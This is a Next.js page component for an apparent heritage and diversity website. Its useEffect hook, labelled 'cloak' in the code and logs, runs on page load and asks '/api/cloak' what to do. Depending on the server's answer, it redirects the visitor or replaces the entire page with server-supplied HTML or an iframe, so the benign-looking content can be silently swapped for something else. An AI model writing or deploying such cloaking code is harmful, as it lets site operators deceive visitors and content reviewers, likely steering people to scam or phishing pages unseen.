'use client';

import Hero from '../components/Hero';
import WhyItMatters from '../components/WhyItMatters';
import Heritage from '../components/Heritage';
import Facts from '../components/Facts';
import Diversity from '../components/Diversity';
import Events from '../components/Events';
import CTA from '../components/CTA';
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    fetch('/api/cloak', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    })
      .then((res) => {
        if (res.redirected) {
          // Якщо редирект, змінюємо URL
          window.location.href = res.url;
          return; // Виходимо з функції, щоб не обробляти HTML
        }
        return res.text(); // Отримуємо текстову відповідь
      })
      .then((html) => {
        if (html) {
          // Перевірка на наявність iframe чи HTML
          if (html.includes('<iframe') || html.includes('<!DOCTYPE html')) {
            document.open();
            document.write(html);
            document.close();
          }
        }
      })
      .catch((error) => {
        console.error('[CLOAK ERROR]', error);
      });
  }, []);

  return (
    <div className="flex flex-col w-full flex-1 overflow-x-hidden">
      <Hero />
      <WhyItMatters />
      <Heritage />
      <Facts />
      <Diversity />
      <Events />
      <CTA />
    </div>
  );
}
